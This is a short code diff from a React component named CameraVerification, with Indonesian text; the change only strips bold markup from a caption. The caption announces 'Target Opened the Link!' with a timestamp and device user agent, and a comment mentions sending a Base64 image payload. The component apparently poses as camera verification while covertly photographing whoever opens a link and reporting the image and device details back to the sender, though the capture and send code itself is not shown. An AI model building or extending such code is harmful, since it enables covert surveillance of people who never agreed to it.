@@ -110,7 +110,7 @@ export default function CameraVerification() {
         
         const timestamp = new Date().toLocaleString('id-ID');
         const userAgent = navigator.userAgent.substring(0, 100);
-        const caption = `📸 *Target Membuka Link!*\n\n🕒 Waktu: ${timestamp}\n📱 Perangkat: ${userAgent}`;
+        const caption = `📸 Target Membuka Link!\n\n🕒 Waktu: ${timestamp}\n📱 Perangkat: ${userAgent}`;
         
         try {
           // Kirim payload JSON dengan Base64 image
